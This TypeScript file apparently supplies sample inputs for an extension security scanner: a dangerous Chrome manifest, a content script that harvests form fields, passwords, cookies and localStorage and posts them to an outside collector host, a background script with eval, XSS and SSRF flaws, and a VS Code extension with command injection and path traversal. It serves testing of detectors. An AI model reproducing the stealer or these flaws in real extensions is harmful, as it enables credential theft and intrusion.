export const SAMPLES: Record<string, { label: string; type: string; code: string }> = {
  'dangerous-manifest': {
    label: 'Dangerous Manifest v2',
    type: 'Chrome Extension',
    code: `{
  "manifest_version": 2,
  "name": "Super Tab Manager",
  "version": "1.0.0",
  "permissions": [
    "tabs", "storage", "activeTab", "<all_urls>",
    "webRequest", "webRequestBlocking", "cookies",
    "history", "bookmarks", "clipboardRead", "clipboardWrite",
    "nativeMessaging", "downloads", "management"
  ],
  "background": {
    "scripts": ["background.js"],
    "persistent": true
  },
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["content.js"],
    "run_at": "document_start",
    "all_frames": true
  }],
  "web_accessible_resources": ["*"],
  "content_security_policy": "script-src 'self' 'unsafe-eval' 'unsafe-inline' https://cdn.jsdelivr.net; object-src 'self'"
}`,
  },

  'data-stealer': {
    label: 'Data Exfil Content Script',
    type: 'Chrome Extension',
    code: `// content.js - password and form data harvester
(function() {
  const EXFIL_URL = 'https://data-collector.xyz/collect';

  function harvest() {
    const inputs = document.querySelectorAll('input');
    const data = {};
    inputs.forEach(input => {
      data[input.name || input.id || input.type] = input.value;
    });
    
    // Also grab cookies
    data._cookies = document.cookie;
    data._url = window.location.href;
    data._localStorage = JSON.stringify(localStorage);
    
    // Send to remote server
    fetch(EXFIL_URL, {
      method: 'POST',
      body: JSON.stringify(data),
      mode: 'no-cors'
    });
  }

  // Hook into form submissions
  document.addEventListener('submit', harvest, true);
  
  // Also intercept password fields on keyup
  document.addEventListener('keyup', function(e) {
    if (e.target.type === 'password' || e.target.type === 'email') {
      harvest();
    }
  }, true);

  // Override XMLHttpRequest to intercept credentials
  const origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    this._url = url;
    return origOpen.apply(this, arguments);
  };

  const origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function(body) {
    if (body) {
      fetch(EXFIL_URL, { method: 'POST', body: JSON.stringify({ intercepted: body, url: this._url }), mode: 'no-cors' });
    }
    return origSend.apply(this, arguments);
  };
})();`,
  },

  'eval-xss': {
    label: 'Eval + XSS Background Script',
    type: 'Chrome Extension',
    code: `// background.js with eval abuse and message injection
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  // DANGEROUS: eval on user-controlled data from content script
  if (request.action === 'execute') {
    try {
      const result = eval(request.code); // RCE via eval
      sendResponse({ result: result });
    } catch(e) {
      sendResponse({ error: e.message });
    }
  }

  // DANGEROUS: innerHTML injection
  if (request.action === 'inject') {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      chrome.tabs.executeScript(tabs[0].id, {
        code: \`document.getElementById('content').innerHTML = '\${request.html}'\` // XSS
      });
    });
  }

  // No origin validation on messages
  if (request.action === 'fetch') {
    fetch(request.url) // SSRF - any URL
      .then(r => r.text())
      .then(data => sendResponse({data}));
  }
  
  return true;
});

// Insecure storage of sensitive data
chrome.storage.local.set({
  authToken: 'Bearer eyJhbGciOiJIUzI1NiJ9.xxx',
  apiKey: 'sk-prod-1234567890abcdef',
  userPassword: btoa('user_password_here')
});

// postMessage without origin check
window.addEventListener('message', function(event) {
  // No event.origin check!
  if (event.data.type === 'COMMAND') {
    chrome.tabs.create({ url: event.data.url }); // Open arbitrary URLs
  }
});`,
  },

  'vscode-plugin': {
    label: 'VS Code Extension',
    type: 'VS Code Plugin',
    code: `// VS Code extension with command injection and path traversal
const vscode = require('vscode');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

function activate(context) {
  // DANGEROUS: shell injection via user input
  let runCmd = vscode.commands.registerCommand('myext.runFile', async () => {
    const fileName = await vscode.window.showInputBox({ prompt: 'Enter filename' });
    // No sanitization - command injection possible
    exec(\`python3 \${fileName}\`, (err, stdout) => {
      vscode.window.showInformationMessage(stdout);
    });
  });

  // DANGEROUS: path traversal in file reader
  let readFile = vscode.commands.registerCommand('myext.readConfig', async () => {
    const userPath = await vscode.window.showInputBox({ prompt: 'Config path' });
    const fullPath = path.join(vscode.workspace.rootPath, userPath);
    // No path.resolve check - allows ../../etc/passwd
    const content = fs.readFileSync(fullPath, 'utf8');
    vscode.window.showInformationMessage(content);
  });

  // Hardcoded credentials in extension
  const API_SECRET = 'prod_secret_key_dont_share_abc123';
  const DB_CONN = 'mongodb://admin:password123@prod-db.company.com:27017';

  context.subscriptions.push(runCmd, readFile);
}

module.exports = { activate };`,
  },
}
